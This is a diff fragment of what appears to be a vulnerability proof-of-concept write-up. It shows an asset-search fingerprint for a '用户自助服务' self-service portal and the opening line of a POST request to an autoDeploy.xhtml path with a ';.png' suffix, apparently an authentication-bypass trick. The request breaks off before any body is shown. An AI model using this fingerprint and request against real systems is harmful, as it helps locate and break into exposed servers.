@@ -8,7 +8,7 @@
 (title="用户自助服务" && body="/selfservice/javax.faces.resource/") || body="/selfservice/index.xhtml"
 ```
 
-## poc
+## POC
 
 ```java
 POST /imc/dc3dtopo/dc2dtopo/autoDeploy.xhtml;.png HTTP/1.1
